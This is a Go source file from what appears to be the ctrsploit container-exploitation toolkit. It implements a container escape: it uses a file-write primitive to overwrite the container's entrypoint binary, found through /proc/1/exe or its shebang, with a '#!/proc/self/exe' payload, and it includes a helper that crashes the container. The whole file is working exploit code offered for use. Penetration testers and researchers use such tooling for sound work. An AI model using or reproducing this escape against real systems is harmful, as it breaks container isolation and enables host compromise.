package pipe_primitive

import (
	"fmt"
	"github.com/ctrsploit/ctrsploit/helper/crash"
	"github.com/ctrsploit/ctrsploit/util"
	"github.com/ssst0n3/awesome_libs/awesome_error"
)

func Escape(primitive Primitive) (err error) {
	err = WriteImageEntrypointAsSelf(primitive)
	if err != nil {
		return
	}
	return
}

func WriteImageEntrypointAsSelf(primitive Primitive) error {
	return WriteImageEntrypoint(primitive, []byte("#!/proc/self/exe\n"))
}

func WriteImageEntrypoint(primitive Primitive, payload []byte) (err error) {
	//path, err := util.GetProcessPathByPid(1)
	//if err != nil {
	//	if errors.Is(err, os.ErrPermission) || errors.Is(err, os.ErrNotExist) {
	//		awesome_error.CheckErr(err)
	//	}
	//	return nil
	//}
	path, err := getEntrypointFilePath(1)
	if err != nil {
		return
	}
	return WriteImage(primitive, path, payload)
}

func getEntrypointFilePath(pid int) (path string, err error) {
	path = fmt.Sprintf("/proc/%d/exe", pid)
	shebang, err := util.IsSheBang(pid)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	if len(shebang) > 0 {
		path = shebang
	}
	return
}

func makeCrash() (err error) {
	return crash.MakeContainerCrash(crash.NewSig())
}
